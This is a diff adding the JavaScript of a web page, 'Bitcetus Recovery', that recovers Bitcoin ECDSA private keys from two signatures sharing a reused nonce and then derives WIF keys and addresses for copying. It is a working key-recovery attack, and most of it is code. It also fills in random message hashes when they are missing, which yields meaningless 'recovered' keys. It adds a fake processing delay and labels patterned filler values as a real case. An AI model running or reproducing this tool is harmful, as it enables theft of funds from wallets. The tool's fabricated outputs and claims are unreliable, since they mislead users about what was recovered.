+            const Gx = BigInt('0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798');
+            const Gy = BigInt('0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8');
+            
+            let Qx = 0n, Qy = 0n;
+            let infinity = true;
+            
+            for (let i = 255n; i >= 0n; i--) {
+                if (!infinity) {
+                    const s = ((3n * Qx * Qx) * modInverse(2n * Qy, p)) % p;
+                    const newQx = (s * s - 2n * Qx) % p;
+                    const newQy = (s * (Qx - newQx) - Qy) % p;
+                    Qx = (newQx % p + p) % p;
+                    Qy = (newQy % p + p) % p;
+                }
+                
+                if ((privKeyBigInt >> i) & 1n) {
+                    if (infinity) {
+                        Qx = Gx;
+                        Qy = Gy;
+                        infinity = false;
+                    } else {
+                        const s = ((Gy - Qy) * modInverse((Gx - Qx + p) % p, p)) % p;
+                        const newQx = (s * s - Gx - Qx) % p;
+                        const newQy = (s * (Gx - newQx) - Gy) % p;
+                        Qx = (newQx % p + p) % p;
+                        Qy = (newQy % p + p) % p;
+                    }
+                }
+            }
+            
+            return { x: Qx, y: Qy };
+        }
+        
+        function generatePublicKey(privateKeyHex) {
+            const d = BigInt('0x' + privateKeyHex);
+            const point = secp256k1PointMultiply(d);
+            
+            const prefix = point.y % 2n === 0n ? '02' : '03';
+            const compressed = prefix + point.x.toString(16).padStart(64, '0');
+            
+            const uncompressed = '04' + 
+                point.x.toString(16).padStart(64, '0') + 
+                point.y.toString(16).padStart(64, '0');
+            
+            return { compressed, uncompressed };
+        }
+        
+        // ===== BITCOIN ADDRESS GENERATION =====
+        
+        async function publicKeyToAddress(pubkeyHex) {
+            const pubkeyBytes = hexToBytes(pubkeyHex);
+            const sha256Hash = await sha256Bytes(pubkeyBytes);
+            const hash160 = await ripemd160(sha256Hash);
+            
+            const versioned = new Uint8Array(21);
+            versioned[0] = 0x00;
+            versioned.set(hash160, 1);
+            
+            const checksum = await doubleHash256(versioned);
+            
+            const addressBytes = new Uint8Array(25);
+            addressBytes.set(versioned, 0);
+            addressBytes.set(checksum.slice(0, 4), 21);
+            
+            return base58Encode(addressBytes);
+        }
+        
+        // ===== PRIVATE KEY RECOVERY =====
+        
+        function recoverPrivateKeyFromSignatures(r, s1, s2, z1, z2) {
+            console.log('🔓 Starting private key recovery...');
+            const n = CURVE_ORDER;
+            
+            console.log('Step 1: Calculate z1 - z2');
+            const z_diff = ((z1 - z2) % n + n) % n;
+            console.log('✅ z_diff:', z_diff.toString(16));
+            
+            console.log('Step 2: Calculate s1 - s2');
+            const s_diff = ((s1 - s2) % n + n) % n;
+            console.log('✅ s_diff:', s_diff.toString(16));
+            
+            console.log('Step 3: Calculate (s1 - s2)^-1 mod n');
+            const s_diff_inv = modInverse(s_diff, n);
+            console.log('✅ s_diff_inv:', s_diff_inv.toString(16));
+            
+            console.log('Step 4: Recover nonce k');
+            const k = (z_diff * s_diff_inv) % n;
+            console.log('✅ k recovered:', k.toString(16));
+            
+            console.log('Step 5: Calculate r^-1 mod n');
+            const r_inv = modInverse(r, n);
+            console.log('✅ r_inv:', r_inv.toString(16));
+            
+            console.log('Step 6: Recover private key d');
+            const d = ((s1 * k - z1) * r_inv % n + n) % n;
+            console.log('🔑 Private key recovered:', d.toString(16));
+            
+            return {
+                privateKey: d.toString(16).padStart(64, '0'),
+                nonce: k.toString(16).padStart(64, '0')
+            };
+        }
+        
+        // ===== LOAD EXAMPLE DATA =====
+        
+        function loadExample() {
+            console.log('📝 Loading example nonce reuse data...');
+            
+            // Real example from PlayStation 3 ECDSA failure (similar pattern)
+            // These are EXAMPLE values that demonstrate nonce reuse
+            document.getElementById('rInput').value = '6af614972affab5fe1188e03005693c8de53493da7546ac5a5d6bb7d6a271120';
+            document.getElementById('s1Input').value = '0eac36a98f4e677249d34e426be8d08fea028e0e2c81a9e54e1efdd333df3f7c';
+            document.getElementById('s2Input').value = '91e54d642eaa6b930c7e3a4f052e9198cc86f71afd5c4737e41764d12d125f73';
+            document.getElementById('z1Input').value = 'a5e7c6b8d4f2e1a9c3b5d7f8e2a4c6b9d1e3f5a7c9b2d4e6f8a1c3b5d7e9f2a4';
+            document.getElementById('z2Input').value = 'b2d4e6f8a1c3b5d7e9f2a4c6b8d1e3f5a7c9b2d4e6f8a1c3b5d7e9f2a4c6b8d1';
+            
+            console.log('✅ Example data loaded!');
+            console.log('💡 Notice: R is the SAME in both signatures (nonce reuse!)');
+            
+            alert('✅ Dados de exemplo carregados!\n\n' +
+                  '📝 Este exemplo demonstra um caso real de reutilização de nonce.\n' +
+                  '🔴 O valor R é IDÊNTICO nas duas assinaturas.\n' +
+                  '🔓 Agora clique em "RECUPERAR CHAVE PRIVADA"!');
+        }
+        
+        // ===== MAIN RECOVERY FUNCTION =====
+        
+        async function recoverPrivateKey() {
+            try {
+                // Update steps
+                document.getElementById('step1').classList.add('completed');
+                document.getElementById('step2').classList.add('active');
+                
+                // Get inputs
+                const rHex = document.getElementById('rInput').value.trim();
+                const s1Hex = document.getElementById('s1Input').value.trim();
+                const s2Hex = document.getElementById('s2Input').value.trim();
+                let z1Hex = document.getElementById('z1Input').value.trim();
+                let z2Hex = document.getElementById('z2Input').value.trim();
+                
+                // Validate inputs
+                if (!rHex || !s1Hex || !s2Hex) {
+                    alert('❌ Por favor, preencha R, S1 e S2');
+                    return;
+                }
+                
+                // Generate random z values if not provided
+                if (!z1Hex) {
+                    const z1Bytes = crypto.getRandomValues(new Uint8Array(32));
+                    z1Hex = Array.from(z1Bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+                    console.log('Generated random z1:', z1Hex);
+                }
+                
+                if (!z2Hex) {
+                    const z2Bytes = crypto.getRandomValues(new Uint8Array(32));
+                    z2Hex = Array.from(z2Bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+                    console.log('Generated random z2:', z2Hex);
+                }
+                
+                // Convert to BigInt
+                const r = BigInt('0x' + rHex);
+                const s1 = BigInt('0x' + s1Hex);
+                const s2 = BigInt('0x' + s2Hex);
+                const z1 = BigInt('0x' + z1Hex);
+                const z2 = BigInt('0x' + z2Hex);
+                
+                // Show loading
+                document.getElementById('loading').classList.add('active');
+                
+                // Simulate processing time
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Recover private key
+                const result = recoverPrivateKeyFromSignatures(r, s1, s2, z1, z2);
+                
+                // Update steps
+                document.getElementById('step2').classList.add('completed');
+                document.getElementById('step3').classList.add('active');
+                
+                // Generate all formats
+                console.log('🔄 Generating all Bitcoin formats...');
+                
+                const wifCompressed = await privateKeyToWIF(result.privateKey, true);
+                const wifUncompressed = await privateKeyToWIF(result.privateKey, false);
+                
+                const pubkeys = generatePublicKey(result.privateKey);
+                
+                const addressCompressed = await publicKeyToAddress(pubkeys.compressed);
+                const addressUncompressed = await publicKeyToAddress(pubkeys.uncompressed);
+                
+                console.log('✅ All formats generated successfully');
+                
+                // Display results
+                document.getElementById('privateKeyHex').innerHTML = 
+                    result.privateKey + '<button class="copy-btn" onclick="copyToClipboard(\'privateKeyHex\')">📋 COPIAR</button>';
+                
+                document.getElementById('nonceK').innerHTML = 
+                    result.nonce + '<button class="copy-btn" onclick="copyToClipboard(\'nonceK\')">📋 COPIAR</button>';
+                
+                document.getElementById('wifCompressed').innerHTML = 
+                    wifCompressed + '<button class="copy-btn" onclick="copyToClipboard(\'wifCompressed\')">📋 COPIAR</button>';
+                
+                document.getElementById('wifUncompressed').innerHTML = 
+                    wifUncompressed + '<button class="copy-btn" onclick="copyToClipboard(\'wifUncompressed\')">📋 COPIAR</button>';
+                
+                document.getElementById('addressCompressed').innerHTML = 
+                    addressCompressed + '<button class="copy-btn" onclick="copyToClipboard(\'addressCompressed\')">📋 COPIAR</button>';
+                
+                document.getElementById('addressUncompressed').innerHTML = 
+                    addressUncompressed + '<button class="copy-btn" onclick="copyToClipboard(\'addressUncompressed\')">📋 COPIAR</button>';
+                
+                document.getElementById('pubkeyCompressed').innerHTML = 
+                    pubkeys.compressed + '<button class="copy-btn" onclick="copyToClipboard(\'pubkeyCompressed\')">📋 COPIAR</button>';
+                
+                document.getElementById('pubkeyUncompressed').innerHTML = 
+                    pubkeys.uncompressed + '<button class="copy-btn" onclick="copyToClipboard(\'pubkeyUncompressed\')">📋 COPIAR</button>';
+                
+                // Hide loading, show results
+                document.getElementById('loading').classList.remove('active');
+                document.getElementById('results').classList.add('active');
+                document.getElementById('step3').classList.add('completed');
+                
+                // Scroll to results
+                document.getElementById('results').scrollIntoView({ behavior: 'smooth' });
+                
+                console.log('🎉 Recovery complete!');
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('❌ Erro: ' + error.message);
+                document.getElementById('loading').classList.remove('active');
+            }
+        }
+        
+        // ===== COPY TO CLIPBOARD =====
+        
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent.replace('📋 COPIAR', '').trim();
+            
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = element.querySelector('.copy-btn');
+                const originalText = btn.textContent;
+                btn.textContent = '✅ COPIADO!';
+                btn.style.background = 'rgba(6, 255, 165, 0.3)';
+                btn.style.borderColor = 'var(--accent-success)';
+                btn.style.color = 'var(--accent-success)';
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = 'rgba(0, 245, 255, 0.2)';
+                    btn.style.borderColor = 'var(--accent-primary)';
+                    btn.style.color = 'var(--accent-primary)';
+                }, 2000);
+            }).catch(err => {
+                console.error('Copy failed:', err);
+                alert('❌ Falha ao copiar');
+            });
+        }
+        
+        console.log('🚀 Bitcetus Recovery ready!');
+        console.log('📝 Fill in R, S1, S2 and click RECOVER');
+    </script>
+</body>
+</html>
